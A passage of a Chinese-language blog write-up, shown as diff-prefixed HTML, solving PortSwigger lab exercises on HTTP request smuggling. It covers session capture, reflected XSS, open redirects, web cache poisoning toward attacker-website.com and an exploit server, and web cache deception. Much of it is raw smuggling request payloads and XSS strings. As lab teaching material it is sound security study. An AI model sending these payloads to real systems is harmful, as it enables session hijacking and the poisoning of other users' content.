+Host<span class="token punctuation">:</span> 0a39003a045004a9c0c11ef300c600e1<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">108</span>
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+POST <span class="token operator">/</span>post<span class="token operator">/</span>comment HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> 0a39003a045004a9c0c11ef300c600e1<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
+Cookie<span class="token punctuation">:</span> session<span class="token operator">=</span>IAAGVCS5HZDv7vi0EfN5CAogNfg7JJQC
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">800</span>
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+
+csrf<span class="token operator">=</span>YEZrZ9zTbfBs02EZ0DGUKKfQK4IJIzQo<span class="token operator">&amp;</span>postId<span class="token operator">=</span><span class="token number">9</span><span class="token operator">&amp;</span>name<span class="token operator">=</span>l1b3ri<span class="token operator">&amp;</span>email<span class="token operator">=</span>l1b3ri<span class="token operator">%</span>40github<span class="token punctuation">.</span>com<span class="token operator">&amp;</span>website<span class="token operator">=</span><span class="token operator">&amp;</span>comment<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_19.36.11.png" alt="截屏2022-10-09 19.36.11.png"></p>
+<p>可能会出现请求错误的情况，是正常的，我们多发送几次就好</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_19.36.31.png" alt="截屏2022-10-09 19.36.31.png"></p>
+<p>我们可以看到后一个用户的数据成功被拼接到我们的comment参数中</p>
+<p>现在数据显示的不全，我们CL的长度设置了400，说明比较小，我们慢慢调整CL长度</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_19.41.18.png" alt="截屏2022-10-09 19.41.18.png"></p>
+<p>我们将长度调整为780时发现可以显示Session（调整CL长度特别费时间，返回的包总是不显示session）：</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_20.41.20.png" alt="截屏2022-10-09 20.41.20.png"></p>
+<p>之后我们尝试去登录，进入myaccount页面，我们用日常欺负的小傻carlos来登录并抓包（记住将Intercept打开，一会修改并放包）</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_19.44.51.png" alt="截屏2022-10-09 19.44.51.png"></p>
+<p>我们将session进行替换为Gay93FhCmBeMBkdJ2MnP6Etnml6UuG8q成功登录</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_20.43.07.png" alt="截屏2022-10-09 20.43.07.png"></p>
+<h2 id="Using-HTTP-request-smuggling-to-exploit-reflected-XSS"><a href="#Using-HTTP-request-smuggling-to-exploit-reflected-XSS" class="headerlink" title="Using HTTP request smuggling to exploit reflected XSS"></a><strong><strong>Using HTTP request smuggling to exploit reflected XSS</strong></strong></h2><p>如果一个应用程序容易受到HTTP请求走私并且还存在反射型XSS，您可以使用请求走私攻击来攻击该应用程序的其他用户。这种方法在两个方面优于对普通反射型XSS的正常利用：</p>
+<ul>
+<li>它不需要与受害者进行交互。无需向受害者提供URL并等待受害者访问恶意网址。而是只需走私一个包含XSS有效负载的请求，后端服务器处理的下一个用户请求就会被命中。</li>
+<li>它可用于利用在正常反射XSS攻击中无法轻松控制的请求部分中的XSS行为，例如HTTP请求请求头。</li>
+</ul>
+<p>例如，假设应用程序在User-Agent标头中存在反射XSS漏洞。您可以在请求走私攻击中利用它，如下所示：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">63</span>
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+GET <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>alert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+Foo<span class="token punctuation">:</span> X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>下一个用户的请求将附加到走私的请求中，该用户将在响应中收到反射型XSS payload。</p>
+<p>通过靶场来看一下：</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss">Lab: Exploiting HTTP request smuggling to deliver reflected XSS | Web Security Academy</a></p>
+<p>按照之前的方法构造payload，UA头有反射型XSS:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> 0add00340474394fc0b57df2004d007f<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">150</span>
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+GET <span class="token operator">/</span>post?postId<span class="token operator">=</span><span class="token number">5</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> a"<span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>alert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">5</span>
+
+x<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_21.08.02.png" alt="截屏2022-10-09 21.08.02.png"></p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_21.11.37.png" alt="截屏2022-10-09 21.11.37.png"></p>
+<h2 id="Using-HTTP-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"><a href="#Using-HTTP-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" class="headerlink" title="Using HTTP request smuggling to turn an on-site redirect into an open redirect"></a><strong><strong>Using HTTP request smuggling to turn an on-site redirect into an open redirect</strong></strong></h2><p>许多应用程序执行从一个 URL 到另一个 URL 的重定向，并将主机名从请求的 Host 标头放入重定向 URL 中。这方面的一个例子是Apache和IIS Web服务器的默认行为，其中对无论是否具有尾部斜杠的文件夹的请求会收到重定向到同一文件夹：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">GET <span class="token operator">/</span>home HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> normal<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+
+HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">301</span> Moved Permanently
+Location<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token operator">//</span>normal<span class="token operator">-</span>website<span class="token punctuation">.</span>com<span class="token operator">/</span>home<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这种行为通常来说被认为是没有影响的，但可以在请求走私攻击中利用它来将其他用户重定向到外部域。例如：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">54</span>
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+GET <span class="token operator">/</span>home HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> attacker<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Foo<span class="token punctuation">:</span> X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>走私请求将触发指向攻击者网站的重定向，这将影响后端服务器处理的下一个用户的请求。我们可以将受害者所访问的域名换成我们自己的攻击域名，例如下一个用户的请求到达后将与我们的内容进行拼接：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">GET <span class="token operator">/</span>home HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> attacker<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Foo<span class="token punctuation">:</span> XGET <span class="token operator">/</span>scripts<span class="token operator">/</span>include<span class="token punctuation">.</span>js HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+
+HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">301</span> Moved Permanently
+Location<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token operator">//</span>attacker<span class="token operator">-</span>website<span class="token punctuation">.</span>com<span class="token operator">/</span>home<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用户的请求是一个由网站页面导入的 JavaScript 文件。攻击者可以通过在响应中返回他们自己的 JavaScript来完全控制受害者</p>
+<h2 id="Turning-root-relative-redirects-into-open-redirects"><a href="#Turning-root-relative-redirects-into-open-redirects" class="headerlink" title="Turning root-relative redirects into open redirects"></a><strong><strong>Turning root-relative redirects into open redirects</strong></strong></h2><p>在某些情况下，我们可能会遇到使用路径为 Location 标头构造根相对 URL 的服务器级重定向，例如：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">GET <span class="token operator">/</span>example HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> normal<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+
+HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">301</span> Moved Permanently
+Location<span class="token punctuation">:</span> <span class="token operator">/</span>example<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果服务器允许我们在路径中使用相对于协议的 URL，这大概率仍然可用于开放重定向：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">GET <span class="token operator">//</span>attacker<span class="token operator">-</span>website<span class="token punctuation">.</span>com<span class="token operator">/</span>example HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+
+HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">301</span> Moved Premanently
+Location<span class="token punctuation">:</span> <span class="token operator">//</span>attacker<span class="token operator">-</span>website<span class="token punctuation">.</span>com<span class="token operator">/</span>example<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>例如我们将Location后指向我们的攻击域名，仍然可以通过JavaScript来进行控制</p>
+<h2 id="Using-HTTP-request-smuggling-to-perform-web-cache-poisoning"><a href="#Using-HTTP-request-smuggling-to-perform-web-cache-poisoning" class="headerlink" title="**Using HTTP request smuggling to perform&nbsp;web cache poisoning"></a>**<strong>Using HTTP request smuggling to perform&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">web cache poisoning</a></strong></h2><p>在上述攻击的变体中，可能会利用 HTTP 请求走私来执行 Web 缓存中毒攻击。如果前端基础架构的任何部分执行内容缓存（通常来说是出于性能原因），则可能会使用异地重定向响应毒害缓存。这将使攻击持续存在，影响随后请求受影响 URL 的任何用户。</p>
+<p>例如攻击者可以发送如下数据包到前端服务器：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">59</span>
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+GET <span class="token operator">/</span>home HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> attacker<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Foo<span class="token punctuation">:</span> XGET <span class="token operator">/</span>static<span class="token operator">/</span>include<span class="token punctuation">.</span>js HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当请求走私到后端服务器时，后端服务器会像以前一样使用异地重定向进行响应。前端服务器根据它认为是第二个请求中的 URL 缓存此响应，即 /static/include.js：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">GET <span class="token operator">/</span>static<span class="token operator">/</span>include<span class="token punctuation">.</span>js HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+
+HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">301</span> Moved Permanently
+Location<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token operator">//</span>attacker<span class="token operator">-</span>website<span class="token punctuation">.</span>com<span class="token operator">/</span>home<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>从这个时候开始，当其他用户请求此 URL 时，他们都会收到指向攻击者网站的重定向。</p>
+<p>我们看一个实例：</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</a></p>
+<p>我们随意打开一篇文章，并点击下一篇，抓去重定向数据包：</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-10_11.29.01.png" alt="截屏2022-10-10 11.29.01.png"></p>
+<p>构造数据包：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> 0a1e003003e17ff1c0460e0000430011<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">134</span>
+
+<span class="token number">0</span>
+
+GET <span class="token operator">/</span>post<span class="token operator">/</span><span class="token builtin">next</span>?postId<span class="token operator">=</span><span class="token number">8</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">10</span>
+
+x<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们可以看到成功访问，那么我们重新访问页面</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-10_11.33.59.png" alt="截屏2022-10-10 11.33.59.png"></p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-10_11.34.33.png" alt="截屏2022-10-10 11.34.33.png"></p>
+<p>可以发现被重定向到了baidu的post页面，那么我们利用靶场提供的漏洞服务器去在/post页面创建一个js脚本：</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-10_11.46.20.png" alt="截屏2022-10-10 11.46.20.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">alert<span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们将Host请求头后加上我们自己的攻击服务器地址并发送数据包，尝试访问，多发送几次，当出现302跳转时，说明成功了，我们刷新页面</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-10_11.53.01.png" alt="截屏2022-10-10 11.53.01.png"></p>
+<p>并且加上需要缓存中毒的js资源，例如/resources/js/tracking.js在请求的最后</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> 0a75006c030d1c5dc01f6c91009f0045<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">306</span>
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+GET <span class="token operator">/</span>post<span class="token operator">/</span><span class="token builtin">next</span>?postId<span class="token operator">=</span><span class="token number">3</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> exploit<span class="token operator">-</span>0a9000cc03211c6dc07c6c13019400b3<span class="token punctuation">.</span>exploit<span class="token operator">-</span>server<span class="token punctuation">.</span>net
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">10</span>
+
+x<span class="token operator">=</span><span class="token number">1</span>
+
+GET <span class="token operator">/</span>resources<span class="token operator">/</span>js<span class="token operator">/</span>tracking<span class="token punctuation">.</span>js HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> 0a75006c030d1c5dc01f6c91009f0045<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
+Connection<span class="token punctuation">:</span> close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-10_15.41.44.png" alt="截屏2022-10-10 15.41.44.png"></p>
+<h2 id="Using-HTTP-request-smuggling-to-perform-web-cache-deception"><a href="#Using-HTTP-request-smuggling-to-perform-web-cache-deception" class="headerlink" title="Using HTTP request smuggling to perform web cache deception"></a><strong><strong>Using HTTP request smuggling to perform web cache deception</strong></strong></h2><p>我们也可以利用HTTP请求走私来执行Web缓存欺骗。其工作方式与 Web 缓存中毒攻击类似，但目的不同。</p>
+<p>1.在 Web 缓存中毒中，攻击者使应用程序在缓存中存储一些恶意payload，并将这些内容从缓存中提供给其他应用程序用户。</p>
+<p>2.在网络缓存欺骗中，攻击者使应用程序将属于另一个用户的一些敏感内容存储在缓存中，然后攻击者从缓存中检索这些内容。</p>
+<p>在这种攻击中，攻击者走私一个请求，该请求返回一些敏感的用户特定内容。例如：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">43</span>
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+GET <span class="token operator">/</span>private<span class="token operator">/</span>messages HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Foo<span class="token punctuation">:</span> X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>转发到后端服务器的其他用户的下一个请求将attach到走私请求中，包括会话 Cookie 和其他请求头。例如：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">GET <span class="token operator">/</span>private<span class="token operator">/</span>messages HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Foo<span class="token punctuation">:</span> XGET <span class="token operator">/</span>static<span class="token operator">/</span>some<span class="token operator">-</span>image<span class="token punctuation">.</span>png HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Cookie<span class="token punctuation">:</span> sessionId<span class="token operator">=</span>q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>后端服务器以正常方式响应此请求。请求中的 URL 用于用户的私人消息，请求在受害者用户会话的上下文中进行处理。前端服务器根据它认为是第二个请求中的 URL（即 /static/some-image）缓存此响应.png：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">GET <span class="token operator">/</span>static<span class="token operator">/</span>some<span class="token operator">-</span>image<span class="token punctuation">.</span>png HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+
+HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">200</span> Ok
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Your private messages<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后，攻击者访问静态 URL 并接收从缓存返回的敏感内容。</p>
+<p>这里有一个重要的警告，攻击者不知道将缓存敏感内容的URL，因为这将是受害者用户在走私请求生效时碰巧请求的任何URL。攻击者可能需要获取大量静态 URL 才能发现捕获的内容。</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception">Lab: Exploiting HTTP request smuggling to perform web cache deception | Web Security Academy</a></p>
+<p>我们首先根据wiener:peter登录账户，</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-10_16.03.52.png" alt="截屏2022-10-10 16.03.52.png"></p>
+<p>我们可以注意到没有任何anti-caching头</p>
+<p>构造payload获取key：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> 0af500560412e808c08c16ea009c0092<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">42</span>
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+GET <span class="token operator">/</span>my<span class="token operator">-</span>account HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+X<span class="token operator">-</span>Ignore<span class="token punctuation">:</span> X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>多发送几次，并稍微等待缓存，然后我们用一个隐私窗口打开并查找API key</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-10_16.04.57.png" alt="截屏2022-10-10 16.04.57.png"></p>
+<p>可以看到API key被缓存下来了</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-10_16.05.43.png" alt="截屏2022-10-10 16.05.43.png"></p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-10_16.06.46.png" alt="截屏2022-10-10 16.06.46.png"></p>
 
                 
             </div>
